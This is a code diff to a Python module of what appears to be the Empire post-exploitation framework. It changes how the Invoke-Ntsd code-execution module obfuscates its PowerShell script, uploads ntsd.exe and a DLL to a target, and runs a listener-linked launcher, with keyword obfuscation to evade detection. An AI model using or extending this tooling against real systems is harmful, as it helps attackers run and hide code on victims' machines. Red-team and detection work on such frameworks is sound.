@@ -1,5 +1,6 @@
 from __future__ import print_function
 
+import pathlib
 from builtins import object
 from builtins import str
 from typing import Dict
@@ -34,18 +35,22 @@ class Module(object):
         
         # read in the common module source code
         module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Ntsd.ps1"
-        if obfuscate:
-            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
-            module_source = module_source.replace("module_source", "obfuscated_module_source")
+        if main_menu.obfuscate:
+            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
+            if pathlib.Path(obfuscated_module_source).is_file():
+                module_source = obfuscated_module_source
+
         try:
-            f = open(module_source, 'r')
+            with open(module_source, 'r') as f:
+                module_code = f.read()
         except:
             return handle_error_message("[!] Could not read module source path at: " + str(module_source))
 
-        module_code = f.read()
-        f.close()
-        
-        script = module_code
+        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
+            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code, obfuscationCommand=main_menu.obfuscateCommand)
+        else:
+            script = module_code
+
         script_end = ""
         if not main_menu.listeners.is_listener_valid(listener_name):
             # not a valid listener, return nothing for the script
@@ -78,18 +83,20 @@ class Module(object):
                 ntsd_exe_upload = main_menu.stagers.generate_upload(ntsd_exe_data, ntsd_exe_upload_path)
                 ntsd_dll_upload = main_menu.stagers.generate_upload(ntsd_dll_data, ntsd_dll_upload_path)
                 
-                script += "\r\n"
-                script += ntsd_exe_upload
-                script += ntsd_dll_upload
-                script += "\r\n"
-                script += exec_write
-                script += "\r\n"
+                script_end += "\r\n"
+                script_end += ntsd_exe_upload
+                script_end += ntsd_dll_upload
+                script_end += "\r\n"
+                script_end += exec_write
+                script_end += "\r\n"
                 # this is to make sure everything was uploaded properly
-                script += "Start-Sleep -s 5"
-                script += "\r\n"
-                script += code_exec
+                script_end += "Start-Sleep -s 5"
+                script_end += "\r\n"
+                script_end += code_exec
 
-                # Get the random function name generated at install and patch the stager with the proper function name
+                if main_menu.obfuscate:
+                    script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
+                script += script_end
                 script = data_util.keyword_obfuscation(script)
 
                 return script
